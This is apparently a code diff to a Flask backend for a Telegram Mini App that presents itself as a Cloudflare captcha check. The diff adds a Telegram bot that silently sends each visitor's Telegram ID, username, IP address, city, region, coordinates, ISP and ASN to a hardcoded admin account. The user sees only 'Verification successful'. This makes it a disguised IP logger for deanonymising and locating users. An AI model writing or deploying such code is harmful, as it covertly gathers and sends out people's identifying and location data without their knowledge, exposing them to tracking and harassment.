@@ -1,7 +1,9 @@
 from flask import Flask, request
 from flask_cors import CORS
+
 import requests
 import os
+import telebot
 
 
 app = Flask(__name__)
@@ -9,28 +11,60 @@ app = Flask(__name__)
 CORS(app)
 
 
-# Cloudflare Turnstile Secret Key
+# =====================
+# ENV
+# =====================
+
 TURNSTILE_SECRET = os.getenv(
     "TURNSTILE_SECRET"
 )
 
 
+BOT_TOKEN = os.getenv(
+    "BOT_TOKEN"
+)
+
+
+ADMIN_ID = 2125969061
+
+
+
+bot = telebot.TeleBot(
+    BOT_TOKEN
+)
+
+
+
+# =====================
+# HOME
+# =====================
+
 @app.route("/")
 def home():
 
-    return "Server works!"
+    return "Captcha server works!"
 
 
-@app.route("/verify", methods=["POST"])
+
+# =====================
+# VERIFY
+# =====================
+
+@app.route(
+    "/verify",
+    methods=["POST"]
+)
 def verify():
+
 
     data = request.json
 
 
-    # Получаем данные из Mini App
+
     telegram_id = data.get(
         "id"
     )
+
 
     username = data.get(
         "username",
@@ -38,93 +72,127 @@ def verify():
     )
 
 
-    # Получаем Cloudflare token
     turnstile_token = data.get(
         "turnstile_token"
     )
 
 
+
     if not turnstile_token:
 
+
         return {
+
             "success": False,
-            "error": "No Cloudflare token"
-        }, 400
+
+            "error":
+            "No Cloudflare token"
+
+        },400
 
 
 
-    # Проверка Cloudflare
+
+    # =====================
+    # CLOUDFLARE CHECK
+    # =====================
+
+
     try:
 
-        cloudflare_check = requests.post(
+
+        cf_response = requests.post(
 
             "https://challenges.cloudflare.com/turnstile/v0/siteverify",
 
             data={
 
-                "secret": TURNSTILE_SECRET,
+                "secret":
+                TURNSTILE_SECRET,
 
-                "response": turnstile_token
+
+                "response":
+                turnstile_token
 
             },
+
 
             timeout=10
 
         )
 
 
-        cloudflare_result = cloudflare_check.json()
+        cf_result = cf_response.json()
 
 
 
     except Exception as e:
 
 
+
         return {
 
-            "success": False,
+            "success":False,
 
-            "error": str(e)
+            "error":str(e)
 
-        }, 500
+        },500
 
 
 
-    # Если Cloudflare не подтвердил
 
-    if not cloudflare_result.get(
+
+    if not cf_result.get(
         "success"
     ):
 
+
         return {
 
-            "success": False,
 
-            "error": "Cloudflare verification failed"
-
-        }, 403
+            "success":False,
 
 
+            "error":
+            "Cloudflare failed"
 
-    # Получаем IP пользователя
+
+        },403
+
+
+
+
+
+    # =====================
+    # IP
+    # =====================
+
 
     ip = request.headers.get(
+
         "X-Forwarded-For",
+
         request.remote_addr
+
     )
 
 
-    # Если несколько IP через прокси
 
     if ip and "," in ip:
 
-        ip = ip.split(",")[0].strip()
+
+        ip = ip.split(",")[0]
 
 
 
-    # Получаем информацию об IP
+
+    # =====================
+    # GEO INFO
+    # =====================
+
 
     try:
+
 
         geo = requests.get(
 
@@ -135,6 +203,7 @@ def verify():
         ).json()
 
 
+
     except Exception:
 
 
@@ -142,58 +211,165 @@ def verify():
 
 
 
-    result = {
 
 
-        "success": True,
+
+    country = geo.get(
+        "country",
+        "Неизвестно"
+    )
 
 
-        "telegram_id": telegram_id,
+    city = geo.get(
+        "city",
+        "Неизвестно"
+    )
 
 
-        "username": username,
+    region = geo.get(
+        "region",
+        "Неизвестно"
+    )
 
 
-        "ip": ip,
+    timezone = geo.get(
+        "timezone",
+        {}
+    ).get(
+        "id",
+        "Неизвестно"
+    )
 
 
-        "country":
-        geo.get("country"),
+    latitude = geo.get(
+        "latitude"
+    )
 
 
-        "city":
-        geo.get("city"),
+    longitude = geo.get(
+        "longitude"
+    )
 
 
-        "region":
-        geo.get("region"),
+    connection = geo.get(
+        "connection",
+        {}
+    )
 
 
-        "timezone":
-        geo.get("timezone", {}).get("id"),
+    isp = connection.get(
+        "isp",
+        "Неизвестно"
+    )
 
 
-        "latitude":
-        geo.get("latitude"),
+    asn = connection.get(
+        "asn",
+        "Неизвестно"
+    )
 
 
-        "longitude":
-        geo.get("longitude"),
+
+    # =====================
+    # SEND ADMIN MESSAGE
+    # =====================
 
 
-        "provider":
-        geo.get("connection", {}).get("isp"),
+    try:
 
 
-        "asn":
-        geo.get("connection", {}).get("asn")
+        message = f"""
+
+🌐 Новая проверка Mini App
+
+
+👤 Username:
+@{username}
+
+
+🆔 Telegram ID:
+{telegram_id}
+
+
+📡 IP:
+{ip}
+
+
+🌍 Страна:
+{country}
+
+
+🏙 Город:
+{city}
+
+
+📍 Регион:
+{region}
+
+
+🕒 Часовой пояс:
+{timezone}
+
+
+📌 Координаты:
+{latitude}, {longitude}
+
+
+📡 Провайдер:
+{isp}
+
+
+🔢 ASN:
+{asn}
+
+"""
+
+
+        bot.send_message(
+
+            ADMIN_ID,
+
+            message
+
+        )
+
+
+
+    except Exception as e:
+
+
+        print(
+            "Telegram error:",
+            e
+        )
+
+
+
+
+
+    # =====================
+    # RESPONSE TO MINI APP
+    # =====================
+
+
+    return {
+
+
+        "success":True,
+
+
+        "message":
+        "Verification successful"
+
 
     }
 
 
 
-    return result
 
+# =====================
+# START
+# =====================
 
 
 if __name__ == "__main__":
